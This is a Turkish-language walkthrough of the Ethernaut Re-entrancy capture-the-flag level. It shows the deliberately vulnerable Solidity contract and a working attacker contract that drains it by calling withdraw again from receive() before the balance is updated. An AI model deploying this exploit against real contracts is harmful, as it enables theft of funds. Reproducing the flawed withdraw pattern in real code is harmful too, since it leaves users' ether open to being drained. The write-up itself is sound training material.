
# ETHERNAUT SORU 10: Re-entrancy

> The goal of this level is for you to steal all the funds from the contract.
> 
> Things that might help:
>
> -   Untrusted contracts can execute code where you least expect it.
> -   Fallback methods
> -   Throw/revert bubbling
> -   Sometimes the best way to attack a contract is with another contract.
> -   See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

Bu soruda Etherimizi saklayabileceğimiz, başkasının ne kadar sakladığını görebileceğimiz ve istediğimiz zaman yatırdığımız miktarı ya da daha azını kendi hesabımıza çekebileceğimiz bir kontrakt bulunmakta.

Bizim amacımız ise içerisinde başlangıçta bulunan 0.001 Etheri tüketerek kontraktın tüm Etherini boşaltmak. Bunu normalde yapamamamız lazım çünkü bu ether bizim hesabımıza tanımlı değil başkasına tanımlı ama koddaki bir açık sayesinde bunu çekmek mümkün. 

Öncelikle bakiye azaltma işleminin Etheri gönderdikten sonra gerçekleştiğine dikkat edelim. Bunun sayesinde Etheri birkaç defa isteyebilir ve bakiyemizden daha büyük bir meblağda Ether çekebiliriz. Bunu el ile yapamayacağımız için bir kontrakt yazmamuz gerekecektir. Bu kontrakt öncelikle küçük bir miktar Ether gönderip kendine bakiye oluşturacak, sonra bu bakiyeyi devamlı olarak çekecek. Burda dikkat etmemiz gereken husus ise kontraktın bakiyesinden daha çok bir miktar çekmeye kalkışmamamız. Çünkü eğer bunu yapar isek tüm fonksiyon çağırma yığını komple iptal(`revert`) edilebilir ve bu girişimimiz başarısız olarak sonuçlanır.

```solidity
// SPDX-License-Identifier: MIT
pragma  solidity  ^0.6.12;
import  "chall.sol";

contract Hack {
int counter =  1;
Reentrance victim;

constructor(address  payable cont)  public  payable{
victim= Reentrance(cont);
}

function pay()  public{
victim.donate{value:  1000000000000000}(address(this));
victim.withdraw(1000000000000000);
}

receive()  external  payable  {
if  (counter>0){
victim.withdraw(1000000000000000);
counter=0;
		}
	}
}
```
Bu kontraktı `1000000000000000` wei ile oluşturup `constructor`a hedef kontraktın adresini giriyoruz. Böylelikle saldırgan kontrakt hazırlanmış durumda oluyor. `pay` fonksiyonunu çağırdığımızda ise sırasıyla `donate` foksiyonu, `withdraw` fonksiyonu çalışıyor. Hedef kontraktan gelen Ether ise `receive` fonksiyonu çalıştırıyor. Bu fonksiyon sadece 1 kez daha `withdraw` işlemini gerçekleştiriyor ve bakiyesinden daha büyük bir miktar Ether istemiş oluyor. Daha bakiye eksiltme koduna gelinmediği için hedef kontrakt bunu veriyor. `counter` 0 olduğu için bu olay bir daha yaşanmıyacaktır ve hedef kontrakt `revert`i çağırmayacaktır.
